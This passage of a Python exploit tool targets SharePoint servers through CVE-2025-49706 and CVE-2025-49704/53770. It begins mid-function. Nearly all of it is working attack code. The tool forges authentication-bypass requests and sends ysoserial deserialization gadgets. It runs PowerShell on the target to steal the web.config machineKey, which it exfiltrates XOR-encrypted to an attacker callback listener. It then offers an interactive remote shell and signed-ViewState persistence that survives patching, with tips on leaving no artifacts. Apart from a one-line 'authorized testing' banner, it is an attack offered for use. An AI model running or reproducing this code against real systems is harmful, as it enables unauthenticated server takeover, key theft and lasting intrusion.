                        print("  This method survives patching of ToolPane.aspx vuln")
                        print("  exit/quit - End session")
                        continue
                    
                    # Build encrypted callback command
                    inner_cmd = self.build_encrypted_exfil_cmd(cmd, callback_ip, callback_port)
                    exfil_cmd = f'powershell -c "{inner_cmd}"'
                    
                    # Generate and send payload
                    CallbackHandler.received_data = None
                    
                    try:
                        viewstate = self.generate_viewstate_payload(
                            exfil_cmd, validation_key, decryption_key, validation_alg, generator
                        )
                    except Exception as e:
                        print(f"[-] Payload generation failed: {e}")
                        continue
                    
                    headers = {
                        'User-Agent': self.user_agent,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': f'{self.target}{AUTH_BYPASS_REFERER}',
                    }
                    body = f'__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={generator}'
                    
                    resp = self.session.post(target_page, data=body, headers=headers, timeout=30)
                    
                    # Wait for output
                    wait_start = time.time()
                    while CallbackHandler.received_data is None:
                        if time.time() - wait_start > cmd_timeout:
                            print("[-] Timeout waiting for output")
                            break
                        time.sleep(0.1)
                    
                    if CallbackHandler.received_data:
                        output = CallbackHandler.received_data.get('output', '')
                        if output:
                            print(output.rstrip())
                        print()
                        
                except KeyboardInterrupt:
                    print("\n[*] Use 'exit' to quit")
                    continue
                    
        finally:
            server._running = False
            CallbackHandler.shell_mode = False
            server.server_close()
            print("[*] ViewState shell terminated")

    def get_auth_bypass_headers(self):
        """
        Get headers required for authentication bypass.
        Uses full URL for Referer as some SharePoint configs require it.
        """
        return {
            'User-Agent': self.user_agent,
            'Referer': f'{self.target}{AUTH_BYPASS_REFERER}',
        }

    def get_viewstate_tokens(self, page_url=None, verbose=False):
        """
        GET a page to extract __VIEWSTATE and __EVENTVALIDATION tokens.
        These are required for POST requests to ASP.NET WebForms pages.
        
        Args:
            page_url: Full URL of page to fetch tokens from (default: ToolPane.aspx)
            verbose: Enable verbose output
        
        Returns:
            dict with 'viewstate', 'viewstategenerator', 'eventvalidation', 'page_url' or None if failed
        """
        if page_url is None:
            url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
        else:
            url = page_url if page_url.startswith('http') else f"{self.target}{page_url}"
        
        headers = self.get_auth_bypass_headers()
        
        try:
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            
            if resp.status_code != 200:
                if verbose:
                    print(f"[DEBUG] Failed to GET page for tokens: HTTP {resp.status_code}")
                return None
            
            html = resp.text
            tokens = {}
            
            # Extract __VIEWSTATE
            viewstate_match = re.search(r'<input[^>]*name="__VIEWSTATE"[^>]*value="([^"]*)"', html)
            if not viewstate_match:
                viewstate_match = re.search(r'<input[^>]*value="([^"]*)"[^>]*name="__VIEWSTATE"', html)
            if viewstate_match:
                tokens['viewstate'] = viewstate_match.group(1)
            
            # Extract __VIEWSTATEGENERATOR
            gen_match = re.search(r'<input[^>]*name="__VIEWSTATEGENERATOR"[^>]*value="([^"]*)"', html)
            if not gen_match:
                gen_match = re.search(r'<input[^>]*value="([^"]*)"[^>]*name="__VIEWSTATEGENERATOR"', html)
            if gen_match:
                tokens['viewstategenerator'] = gen_match.group(1)
            
            # Extract __EVENTVALIDATION
            ev_match = re.search(r'<input[^>]*name="__EVENTVALIDATION"[^>]*value="([^"]*)"', html)
            if not ev_match:
                ev_match = re.search(r'<input[^>]*value="([^"]*)"[^>]*name="__EVENTVALIDATION"', html)
            if ev_match:
                tokens['eventvalidation'] = ev_match.group(1)
            
            # Store the page URL in tokens for reference
            tokens['page_url'] = url
            
            if verbose:
                print(f"[DEBUG] Extracted tokens from: {url}")
                print(f"        __VIEWSTATE: {tokens.get('viewstate', 'NOT FOUND')[:50]}...")
                print(f"        __VIEWSTATEGENERATOR: {tokens.get('viewstategenerator', 'NOT FOUND')}")
                print(f"        __EVENTVALIDATION: {tokens.get('eventvalidation', 'NOT FOUND')[:50] if tokens.get('eventvalidation') else 'NOT FOUND'}...")
            
            return tokens if tokens.get('viewstate') else None
            
        except Exception as e:
            if verbose:
                print(f"[DEBUG] Error getting tokens: {e}")
            return None

    def send_payload(self, dwp_payload, verbose=False):
        """
        Send the exploit POST request with the given DWP payload.
        Matches the working l0ggg/ToolShell PoC structure.
        """
        url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
        
        # Headers matching the working PoC - relative Referer path
        headers = {
            'User-Agent': self.user_agent,
            'Referer': AUTH_BYPASS_REFERER,  # Relative path: /_layouts/SignOut.aspx
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Connection': 'close',
        }
        
        # POST data matching the working PoC
        # Note: .ascx not .aspx for MSOTlPn_Uri
        data = {
            'MSOTlPn_Uri': f'{self.target}/_controltemplates/15/AclEditor.ascx',
            'MSOTlPn_DWP': dwp_payload,
        }
        
        if verbose:
            print(f"[DEBUG] URL: {url}")
            print(f"[DEBUG] Headers: {headers}")
            print(f"[DEBUG] MSOTlPn_Uri: {data['MSOTlPn_Uri']}")
            print(f"[DEBUG] Payload size: {len(dwp_payload)} chars")
        
        try:
            resp = self.session.post(
                url,
                headers=headers,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            if verbose:
                print(f"[DEBUG] Response status: {resp.status_code}")
                if resp.status_code not in [200, 302]:
                    print(f"[DEBUG] Response headers: {dict(resp.headers)}")
            
            return resp
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return None

    def auto_exploit(self, verbose=False, callback_ip=None, callback_port=8888):
        """
        Fully automated exploitation:
        1. Check if target is vulnerable
        2. Extract MachineKey from web.config
           - Via HTTP callback (recommended - no artifacts)
           - Via temp file (fallback)
        
        Args:
            verbose: Enable verbose output for debugging
            callback_ip: If set, use HTTP callback to exfiltrate keys directly (recommended)
            callback_port: Port for HTTP callback listener (default: 8888)
        
        Returns:
            dict with exploitation results including extracted MachineKey
        """
        results = {
            'vulnerable': False,
            'exploit_sent': False,
            'machinekey': None
        }
        
        # Step 1: Check vulnerability
        print("\n[*] Phase 1: Checking vulnerability...")
        vuln, status = self.check_vulnerable()
        if not vuln:
            print(f"[-] Target does not appear vulnerable (status: {status})")
            return results
        
        print(f"[+] Target appears vulnerable (status: {status})")
        results['vulnerable'] = True
        
        # Step 2: Extract MachineKey directly from web.config
        # This method works even without write access to web folders
        
        # Dynamic web.config discovery - searches VirtualDirectories for any port
        # Also checks common alternative paths
        webconfig_discovery = (
            "(Get-ChildItem 'C:/inetpub/wwwroot/wss/VirtualDirectories/*/web.config' -ErrorAction SilentlyContinue | "
            "Where-Object {(Get-Content $_.FullName -Raw) -match 'machineKey'} | Select-Object -First 1).FullName"
        )
        
        if callback_ip:
            # Use HTTP callback - no file write needed!
            print(f"\n[*] Phase 2: Extracting MachineKey via HTTP callback to {callback_ip}:{callback_port}...")
            print("[*] Dynamically discovering web.config path...")
            
            # PowerShell to find web.config dynamically, XOR encrypt, and send via HTTP POST
            # Uses Get-ChildItem with wildcard to find web.config in any VirtualDirectories subfolder
            # Data is XOR encrypted for opsec - nothing readable in transit
            extract_cmd = self.build_encrypted_machinekey_exfil_cmd(callback_ip, callback_port)
            
            print("[*] Generating BinaryFormatter gadget via ysoserial.exe...")
            try:
                compressed_gadget = self.generate_compressed_gadget(extract_cmd)
            except Exception as e:
                print(f"[-] Failed to generate gadget: {e}")
                return results
            
            # Build DWP payload
            dwp_payload = self.build_dwp_payload(compressed_gadget)
            
            # Start listener in background thread
            listener_thread = threading.Thread(
                target=lambda: start_callback_listener('0.0.0.0', callback_port, timeout=30)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            time.sleep(0.5)  # Give listener time to start
            
            # Step 3: Send the exploit
            print(f"\n[*] Phase 3: Sending exploit (callback will arrive at {callback_ip}:{callback_port})...")
            resp = self.send_payload(dwp_payload, verbose=verbose)
            
            if resp is None:
                print("[-] Failed to send exploit request")
                return results
            
            print(f"[*] Response: HTTP {resp.status_code}")
            results['exploit_sent'] = True
            
            # Wait for callback
            print("\n[*] Phase 4: Waiting for callback with MachineKey...")
            listener_thread.join(timeout=35)
            
            if CallbackHandler.received_data:
                results['machinekey'] = CallbackHandler.received_data
            else:
                print("[-] No callback received - target may not be able to reach your IP")
                print("[*] Falling back to file-based extraction...")
                results['machinekey'] = {'extracted_to': 'C:\\Windows\\Temp\\spkey.txt', 'callback_failed': True}
        
        else:
            # File-based extraction
            print("\n[*] Phase 2: Extracting MachineKey from web.config...")
            print("[*] Dynamically discovering web.config path...")
            
            temp_file = "C:/Windows/Temp/spkey.txt"
            
            # Command to find web.config dynamically and extract machineKey
            # Uses wildcard to find web.config in any VirtualDirectories port folder
            extract_cmd = (
                "$wc = Get-ChildItem 'C:/inetpub/wwwroot/wss/VirtualDirectories/*/web.config' -ErrorAction SilentlyContinue | "
                "Where-Object {(Get-Content $_.FullName -Raw) -match 'machineKey'} | Select-Object -First 1; "
                f"if($wc){{Get-Content $wc.FullName | Select-String -Pattern 'machineKey' | Out-File '{temp_file}' -Encoding UTF8}}"
            )
            
            print("[*] Generating BinaryFormatter gadget via ysoserial.exe...")
            try:
                compressed_gadget = self.generate_compressed_gadget(extract_cmd)
            except Exception as e:
                print(f"[-] Failed to generate gadget: {e}")
                return results
            
            # Build DWP payload
            dwp_payload = self.build_dwp_payload(compressed_gadget)
            
            # Step 3: Send the exploit to extract MachineKey
            print("\n[*] Phase 3: Sending exploit to extract MachineKey from web.config...")
            resp = self.send_payload(dwp_payload, verbose=verbose)
            
            if resp is None:
                print("[-] Failed to send exploit request")
                return results
            
            print(f"[*] Response: HTTP {resp.status_code}")
            
            # Check if exploit actually worked
            if resp.status_code == 401:
                print("[-] EXPLOIT FAILED: HTTP 401 Unauthorized")
                print("[!] The authentication bypass did not work for the POST request.")
                print("[*] Possible causes:")
                print("    1. Target is patched against CVE-2025-49706")
                print("    2. Different SharePoint authentication configuration")
                print("    3. WAF blocking or modifying the Referer header")
                print("    4. The target version may require a different bypass technique")
                print("\n[*] Debug: Try checking in Burp if the Referer header is being sent correctly")
                return results
            elif resp.status_code == 403:
                print("[-] EXPLOIT FAILED: HTTP 403 Forbidden")
                print("[!] Server rejected the request - may be blocked by security controls")
                return results
            elif resp.status_code not in [200, 302, 500]:
                # 500 can sometimes indicate deserialization worked but threw an exception
                print(f"[-] Unexpected response code: {resp.status_code}")
                print("[*] Continuing anyway to check if payload executed...")
            
            results['exploit_sent'] = True
            
            # Step 4: Inform user about the temp file
            print(f"\n[*] Phase 4: MachineKey extracted to {temp_file}")
            print("[*] NOTE: You need to retrieve this file manually (e.g., via SMB, RDP, or additional RCE)")
            print("")
            print("[*] To retrieve via another RCE command, run:")
            print(f"    python toolshell.py -t {self.target} --run-cmd \"Get-Content {temp_file}\" --ysoserial <path>")
            print("")
            print("[*] After retrieving the key, clean up with:")
            print(f"    python toolshell.py -t {self.target} --run-cmd \"Remove-Item '{temp_file}' -Force\" --ysoserial <path>")
            print("")
            print("[*] The file contains the machineKey line from web.config in format:")
            print("    <machineKey validationKey=\"...\" decryptionKey=\"...\" validation=\"...\" />")
            
            results['machinekey'] = {'extracted_to': temp_file}
        
        return results


class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler to receive XOR-encrypted exfiltrated data via POST callback.
    
    All exfiltration uses POST for better opsec - no sensitive data in URLs/logs.
    Data is XOR encrypted with CALLBACK_XOR_KEY for additional stealth.
    """
    
    received_data = None
    shell_mode = False  # When True, suppress extra output for cleaner shell experience
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass
    
    def do_POST(self):
        """Handle POST request with XOR-encrypted exfiltrated data in body"""
        content_length = int(self.headers.get('Content-Length', 0))
        body_raw = self.rfile.read(content_length).decode('utf-8', errors='ignore').strip()
        
        # Decrypt the XOR-encrypted base64 data
        try:
            body = xor_decrypt(body_raw, CALLBACK_XOR_KEY)
        except Exception:
            # Fallback to plaintext if decryption fails (shouldn't happen)
            body = body_raw
        
        # Check if this is MachineKey data (contains machineKey XML)
        if 'machineKey' in body and 'validationKey' in body:
            # Parse the machineKey XML line
            vk_match = re.search(r'validationKey="([^"]+)"', body)
            dk_match = re.search(r'decryptionKey="([^"]+)"', body)
            va_match = re.search(r'validation="([^"]+)"', body)
            
            CallbackHandler.received_data = {
                'validation_key': vk_match.group(1) if vk_match else '',
                'decryption_key': dk_match.group(1) if dk_match else '',
                'validation_alg': va_match.group(1) if va_match else 'HMACSHA256',
                'raw': body
            }
            if not CallbackHandler.shell_mode:
                print(f"\n[+] Callback received - MachineKey captured (encrypted)")
        else:
            # Shell command output
            CallbackHandler.received_data = {'output': body, 'type': 'shell'}
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')


def start_callback_listener(ip, port, timeout=30):
    """Start HTTP listener and wait for callback"""
    CallbackHandler.received_data = None
    
    server = HTTPServer((ip, port), CallbackHandler)
    server.timeout = timeout
    
    print(f"[*] Started HTTP listener on {ip}:{port}")
    print(f"[*] Waiting for callback (timeout: {timeout}s)...")
    
    # Handle one request or timeout
    start_time = time.time()
    while CallbackHandler.received_data is None:
        server.handle_request()
        if time.time() - start_time > timeout:
            print("[-] Callback timeout - no response received")
            break
    
    server.server_close()
    return CallbackHandler.received_data


def print_banner():
    banner = """
+===========================================================================+
|  ToolShell Exploit - SharePoint Unauthenticated RCE                       |
|  CVE-2025-49706 (Auth Bypass) + CVE-2025-49704 (Deserialization)          |
|                                                                           |
|  For authorized penetration testing only.                                 |
+===========================================================================+
"""
    print(banner)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='ToolShell - SharePoint Server RCE Exploit (CVE-2025-49706 + CVE-2025-49704)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Pseudo-interactive shell (recommended)
  python toolshell.py -t https://sharepoint.local --shell \\
    --ysoserial C:\\Tools\\ysoserial.exe --callback-ip YOUR_IP

  # Run single command with output
  python toolshell.py -t https://sharepoint.local --run-cmd "whoami" \\
    --ysoserial C:\\Tools\\ysoserial.exe --callback-ip YOUR_IP

  # Extract MachineKey for ViewState persistence
  python toolshell.py -t https://sharepoint.local --auto-pwn \\
    --ysoserial C:\\Tools\\ysoserial.exe --callback-ip YOUR_IP

  # ViewState RCE (after extracting MachineKey)
  python toolshell.py -t https://sharepoint.local --viewstate-shell \\
    --ysoserial C:\\Tools\\ysoserial.exe --callback-ip YOUR_IP \\
    --validation-key "515901EB..." --decryption-key "5A67E628..."

  # ViewState single command
  python toolshell.py -t https://sharepoint.local --viewstate-cmd "whoami" \\
    --ysoserial C:\\Tools\\ysoserial.exe --callback-ip YOUR_IP \\
    --validation-key "515901EB..." --decryption-key "5A67E628..."

  # Check if target is vulnerable
  python toolshell.py -t https://sharepoint.local --check
'''
    )
    
    parser.add_argument('-t', '--target', help='Target SharePoint URL')
    parser.add_argument('--check', action='store_true', help='Check if target is vulnerable')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output for debugging')
    
    # Automated exploitation
    parser.add_argument('--auto-pwn', action='store_true', 
                        help='Extract MachineKey for ViewState persistence attacks')
    parser.add_argument('--ysoserial', metavar='PATH',
                        help='Path to ysoserial.exe with DataSetXML gadget (required for exploitation)')
    
    # Interactive shell
    parser.add_argument('--shell', action='store_true',
                        help='Start pseudo-interactive shell (requires --callback-ip)')
    
    # Single command execution
    parser.add_argument('--run-cmd', metavar='CMD',
                        help='Run a single command and show output (requires --callback-ip)')
    
    # ViewState RCE (requires extracted MachineKey)
    parser.add_argument('--viewstate-shell', action='store_true',
                        help='Start shell using signed ViewState payloads (requires MachineKey)')
    parser.add_argument('--viewstate-cmd', metavar='CMD',
                        help='Run command via signed ViewState (requires MachineKey)')
    parser.add_argument('--viewstate-page', metavar='PATH',
                        help='Target page for ViewState attack (default: /_layouts/15/ToolPane.aspx)')
    parser.add_argument('--validation-key', metavar='KEY',
                        help='MachineKey validationKey (hex string)')
    parser.add_argument('--decryption-key', metavar='KEY',
                        help='MachineKey decryptionKey (hex string)')
    parser.add_argument('--validation-alg', metavar='ALG', default='HMACSHA256',
                        help='MachineKey validation algorithm (default: HMACSHA256)')
    
    # Exfiltration callback
    parser.add_argument('--callback-ip', metavar='IP',
                        help='Your IP address for HTTP callback (required for --shell and --run-cmd)')
    parser.add_argument('--callback-port', type=int, default=8888,
                        help='Port for HTTP callback listener (default: 8888)')
    
    # Gadget encoding (advanced)
    parser.add_argument('--encode-gadget', metavar='FILE', 
                        help='Gzip+Base64 encode a raw ysoserial gadget file')
    parser.add_argument('--decode-gadget', metavar='STRING',
                        help='Decode a CompressedDataTable value (for analysis)')
    
    args = parser.parse_args()
    
    # Handle gadget encoding/decoding (no target required)
    if args.encode_gadget:
        print(f"[*] Encoding gadget file: {args.encode_gadget}")
        try:
            with open(args.encode_gadget, 'rb') as f:
                raw_data = f.read()
            encoded = ToolShellExploit.gzip_base64_encode(raw_data)
            print(f"[+] Encoded payload ({len(raw_data)} bytes -> {len(encoded)} chars):\n")
            print(encoded)
            print("\n[*] Use this value in the CompressedDataTable attribute")
        except FileNotFoundError:
            print(f"[-] File not found: {args.encode_gadget}")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error encoding gadget: {e}")
            sys.exit(1)
        return
    
    if args.decode_gadget:
        print("[*] Decoding CompressedDataTable value...")
        try:
            raw = ToolShellExploit.gzip_base64_decode(args.decode_gadget)
            print(f"[+] Decoded {len(raw)} bytes")
            # Check for common .NET serialization markers
            if raw[:2] == b'\x00\x01':
                print("[*] Looks like BinaryFormatter serialized data")
            print(f"\n[*] First 200 bytes (hex):\n{raw[:200].hex()}")
            print(f"\n[*] Strings found:")
            # Extract printable strings
            import re
            strings = re.findall(b'[\x20-\x7e]{4,}', raw)
            for s in strings[:20]:
                print(f"    {s.decode()}")
        except Exception as e:
            print(f"[-] Error decoding: {e}")
            sys.exit(1)
        return
    
    # Target-based operations require --target
    if not args.target:
        parser.print_help()
        print("\n[!] --target is required for vulnerability checks and exploitation")
        sys.exit(1)
    
    # Validate ysoserial path
    if (args.auto_pwn or args.run_cmd or args.shell or args.viewstate_shell or args.viewstate_cmd) and not args.ysoserial:
        print("[!] --auto-pwn, --run-cmd, --shell, --viewstate-shell and --viewstate-cmd require --ysoserial <path_to_ysoserial.exe>")
        sys.exit(1)
    
    # Shell and run-cmd require callback-ip
    if (args.shell or args.run_cmd) and not args.callback_ip:
        print("[!] --shell and --run-cmd require --callback-ip <your_ip>")
        sys.exit(1)
    
    # ViewState modes require MachineKey and callback
    if args.viewstate_shell or args.viewstate_cmd:
        if not args.validation_key or not args.decryption_key:
            print("[!] --viewstate-shell and --viewstate-cmd require:")
            print("    --validation-key <hex_key>")
            print("    --decryption-key <hex_key>")
            print("[*] Extract these with --auto-pwn --callback-ip first")
            sys.exit(1)
        if not args.callback_ip:
            print("[!] --viewstate-shell and --viewstate-cmd require --callback-ip <your_ip>")
            sys.exit(1)
    
    exploit = ToolShellExploit(
        args.target, 
        proxy=args.proxy, 
        timeout=args.timeout,
        ysoserial_path=args.ysoserial
    )
    
    # Get SharePoint version
    print(f"[*] Target: {args.target}")
    version = exploit.get_sharepoint_version()
    print(f"[*] SharePoint Version: {version}")
    
    # Shell mode - interactive pseudo-shell
    if args.shell:
        print("\n[*] Checking vulnerability before starting shell...")
        is_vuln, status = exploit.check_vulnerable()
        if not is_vuln:
            print(f"[-] Target does not appear vulnerable (status: {status})")
            sys.exit(1)
        
        if not os.path.exists(args.ysoserial):
            print(f"[-] ysoserial.exe not found at: {args.ysoserial}")
            sys.exit(1)
        
        # Auto-detect which exploit method works
        print("[*] Detecting exploit method...")
        method, cve = exploit.detect_exploit_method(args.callback_ip, args.callback_port)
        
        if method is None:
            print("[-] Target appears fully patched - both CVE-2025-49704 and CVE-2025-53770")
            sys.exit(1)
        
        print(f"[+] Using {cve} for exploitation")
        print("[+] Starting shell...")
        
        exploit.run_shell(
            callback_ip=args.callback_ip,
            callback_port=args.callback_port,
            cmd_timeout=args.timeout
        )
        sys.exit(0)
    
    # Single command mode - run one command and show output
    if args.run_cmd:
        print("\n" + "=" * 60)
        print("[*] SINGLE COMMAND MODE")
        print("=" * 60)
        print(f"[*] Command: {args.run_cmd}")
        
        if not os.path.exists(args.ysoserial):
            print(f"[-] ysoserial.exe not found at: {args.ysoserial}")
            sys.exit(1)
        
        # Check vuln first
        print("\n[*] Checking vulnerability...")
        is_vuln, status = exploit.check_vulnerable()
        if not is_vuln:
            print(f"[-] Target does not appear vulnerable (status: {status})")
            sys.exit(1)
        
        # Auto-detect which exploit method works
        print("[*] Detecting exploit method...")
        method, cve = exploit.detect_exploit_method(args.callback_ip, args.callback_port)
        
        if method is None:
            print("[-] Target appears fully patched - both CVE-2025-49704 and CVE-2025-53770")
            sys.exit(1)
        
        print(f"[+] Using {cve} for exploitation")
        
        # Build encrypted callback exfiltration command
        exfil_cmd = exploit.build_encrypted_exfil_cmd(args.run_cmd, args.callback_ip, args.callback_port)
        
        # Start listener in background
        CallbackHandler.received_data = None
        CallbackHandler.shell_mode = True
        
        server = HTTPServer(('0.0.0.0', args.callback_port), CallbackHandler)
        server.timeout = args.timeout
        
        def handle_one():
            server.handle_request()
        
        listener_thread = threading.Thread(target=handle_one, daemon=True)
        listener_thread.start()
        
        time.sleep(0.3)  # Give listener time to start
        
        # Generate and send payload
        print("\n[*] Generating payload...")
        try:
            compressed_gadget = exploit.generate_compressed_gadget(exfil_cmd)
            dwp_payload = exploit.build_dwp_payload(compressed_gadget)
            
            print(f"[*] Sending exploit (callback to {args.callback_ip}:{args.callback_port})...")
            resp = exploit.send_payload(dwp_payload, verbose=args.verbose)
            
            if resp and resp.status_code in [200, 302, 500]:
                print(f"[+] Exploit sent (HTTP {resp.status_code})")
                print("[*] Waiting for output...\n")
                
                # Wait for callback
                listener_thread.join(timeout=args.timeout)
                
                if CallbackHandler.received_data:
                    output = CallbackHandler.received_data.get('output', '')
                    if output:
                        print(output.rstrip())
                    else:
                        print("[-] No output received")
                else:
                    print("[-] Timeout - no callback received")
            else:
                print(f"[-] Exploit may have failed (HTTP {resp.status_code if resp else 'no response'})")
        except Exception as e:
            print(f"[-] Error: {e}")
            sys.exit(1)
        finally:
            server.server_close()
            CallbackHandler.shell_mode = False
        
        sys.exit(0)
    
    # ViewState Shell mode - uses extracted MachineKey
    if args.viewstate_shell:
        print("\n" + "=" * 60)
        print("[*] VIEWSTATE SHELL MODE")
        print("=" * 60)
        print("[*] Using signed ViewState payloads for RCE")
        print("[*] This method survives patching of ToolPane.aspx vuln")
        
        if not os.path.exists(args.ysoserial):
            print(f"[-] ysoserial.exe not found at: {args.ysoserial}")
            sys.exit(1)
        
        exploit.run_viewstate_shell(
            validation_key=args.validation_key,
            decryption_key=args.decryption_key,
            validation_alg=args.validation_alg,
            callback_ip=args.callback_ip,
            callback_port=args.callback_port,
            target_page=args.viewstate_page,
            cmd_timeout=args.timeout
        )
        sys.exit(0)
    
    # ViewState single command mode
    if args.viewstate_cmd:
        print("\n" + "=" * 60)
        print("[*] VIEWSTATE COMMAND MODE")
        print("=" * 60)
        print(f"[*] Command: {args.viewstate_cmd}")
        print("[*] Using signed ViewState payload")
        
        if not os.path.exists(args.ysoserial):
            print(f"[-] ysoserial.exe not found at: {args.ysoserial}")
            sys.exit(1)
        
        output = exploit.run_viewstate_cmd(
            command=args.viewstate_cmd,
            validation_key=args.validation_key,
            decryption_key=args.decryption_key,
            validation_alg=args.validation_alg,
            callback_ip=args.callback_ip,
            callback_port=args.callback_port,
            target_page=args.viewstate_page,
            verbose=args.verbose
        )
        
        if output:
            print("\n" + "-" * 40)
            print(output.rstrip())
            print("-" * 40)
        
        sys.exit(0)
    
    if args.auto_pwn:
        # Fully automated exploitation
        print("\n" + "=" * 60)
        print("[*] AUTOMATED EXPLOITATION MODE")
        print("=" * 60)
        
        # Verify ysoserial.exe exists
        if not os.path.exists(args.ysoserial):
            print(f"[-] ysoserial.exe not found at: {args.ysoserial}")
            sys.exit(1)
        print(f"[+] Using ysoserial.exe: {args.ysoserial}")
        
        if args.callback_ip:
            print(f"[+] Using HTTP callback exfiltration: {args.callback_ip}:{args.callback_port}")
            
            # Auto-detect which exploit method works
            print("\n[*] Detecting exploit method...")
            method, cve = exploit.detect_exploit_method(args.callback_ip, args.callback_port)
            
            if method is None:
                print("[-] Target appears fully patched - both CVE-2025-49704 and CVE-2025-53770")
                sys.exit(1)
            
            print(f"[+] Using {cve} for exploitation")
        else:
            print("\n" + "!" * 60)
            print("[!] WARNING: No callback IP specified!")
            print("[!] File-based extraction will leave artifacts on the server:")
            print("[!]   - Temporary file with extracted MachineKey data")
            print("[!]   - You will need to manually retrieve and delete the file")
            print("!" * 60)
            print("\n[*] RECOMMENDED: Use --callback-ip YOUR_IP --callback-port PORT")
            print("[*]              This extracts data via HTTP with NO file artifacts\n")
            
            try:
                confirm = input("[?] Continue with file-based extraction? (y/N): ").strip().lower()
                if confirm != 'y':
                    print("[-] Aborted. Use --callback-ip for cleaner exfiltration.")
                    sys.exit(0)
            except KeyboardInterrupt:
                print("\n[-] Aborted.")
                sys.exit(0)
        
        results = exploit.auto_exploit(
            verbose=args.verbose,
            callback_ip=args.callback_ip,
            callback_port=args.callback_port
        )
        
        print("\n" + "=" * 60)
        print("[*] EXPLOITATION SUMMARY")
        print("=" * 60)
        print(f"    Vulnerable:      {results['vulnerable']}")
        print(f"    Exploit Sent:    {results['exploit_sent']}")
        print(f"    MachineKey:      {'EXTRACTED' if results['machinekey'] else 'FAILED'}")
        
        if results['machinekey']:
            # Check if we have actual key values (from callback) or just file location
            if 'validation_key' in results['machinekey'] and results['machinekey']['validation_key']:
                print("\n" + "=" * 60)
                print("[+] EXTRACTED MACHINEKEY VALUES:")
                print("=" * 60)
                print(f"    ValidationKey:  {results['machinekey']['validation_key']}")
                print(f"    DecryptionKey:  {results['machinekey']['decryption_key']}")
                print(f"    ValidationAlg:  {results['machinekey']['validation_alg']}")
                print("\n[*] Use ysoserial.exe to generate ViewState payload:")
                print(f"    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"whoami\" \\")
                print(f"      --validationkey=\"{results['machinekey']['validation_key']}\" \\")
                print(f"      --decryptionkey=\"{results['machinekey']['decryption_key']}\" \\")
                print(f"      --validationalg=\"{results['machinekey']['validation_alg']}\" \\")
                print(f"      --generator=\"<VIEWSTATEGENERATOR>\" --islegacy --minify")
            elif 'extracted_to' in results['machinekey']:
                print("\n[*] Next steps for persistence:")
                print(f"    1. Retrieve the machineKey from: {results['machinekey']['extracted_to']}")
                print(f"    2. Extract validationKey and decryptionKey values from that file")
                print(f"    3. Use ysoserial.exe to generate ViewState payload:")
                print(f"       ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"command\" \\")
                print(f"         --validationkey=\"<VALIDATION_KEY>\" \\")
                print(f"         --validationalg=\"HMACSHA256\" \\")
                print(f"         --generator=\"<VIEWSTATEGENERATOR>\" --islegacy --minify")
            elif 'raw' in results['machinekey']:
                print("\n[+] Raw machineKey data received:")
                print(f"    {results['machinekey']['raw']}")
            print(f"\n[*] Send signed payload to any SharePoint page with ViewState")
        
    elif args.check:
        print("\n[*] Checking vulnerability status...")
        print("=" * 60)
        
        # First check auth bypass (CVE-2025-49706)
        print("\n[1] Testing CVE-2025-49706 (Auth Bypass)...")
        vuln, status = exploit.check_vulnerable()
        if vuln:
            print(f"    [+] Auth bypass WORKS (HTTP {status})")
        else:
            print(f"    [-] Auth bypass FAILED (HTTP {status})")
            print("\n[-] Target is not vulnerable - auth bypass patched")
            sys.exit(1)
        
        # If we have callback-ip, test actual RCE
        if args.callback_ip and args.ysoserial:
            print("\n[2] Testing RCE vulnerabilities...")
            method, cve = exploit.detect_exploit_method(args.callback_ip, args.callback_port)
            
            print("\n" + "=" * 60)
            print("[*] VULNERABILITY STATUS:")
            print("=" * 60)
            print(f"    CVE-2025-49706 (Auth Bypass):    VULNERABLE")
            
            if method == 'normal':
                print(f"    CVE-2025-49704 (Deserialization): VULNERABLE")
                print(f"    CVE-2025-53770 (Patch Bypass):    Not needed")
                print("\n[+] Target is FULLY VULNERABLE to original exploit")
            elif method == 'bypass':
                print(f"    CVE-2025-49704 (Deserialization): PATCHED")
                print(f"    CVE-2025-53770 (Patch Bypass):    VULNERABLE")
                print("\n[+] Target is VULNERABLE via whitespace bypass")
                print("[*] The tool will automatically use the bypass")
            else:
                print(f"    CVE-2025-49704 (Deserialization): PATCHED")
                print(f"    CVE-2025-53770 (Patch Bypass):    PATCHED")
                print("\n[-] Target is FULLY PATCHED - RCE not possible")
                sys.exit(1)
            
            print("\n[!] Use --shell for interactive access or --auto-pwn to extract MachineKey")
        else:
            print("\n[*] Auth bypass confirmed. To test RCE, provide:")
            print("    --callback-ip YOUR_IP --ysoserial PATH_TO_YSOSERIAL")
            print("\n[!] Use --shell for interactive access or --auto-pwn to extract MachineKey")
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
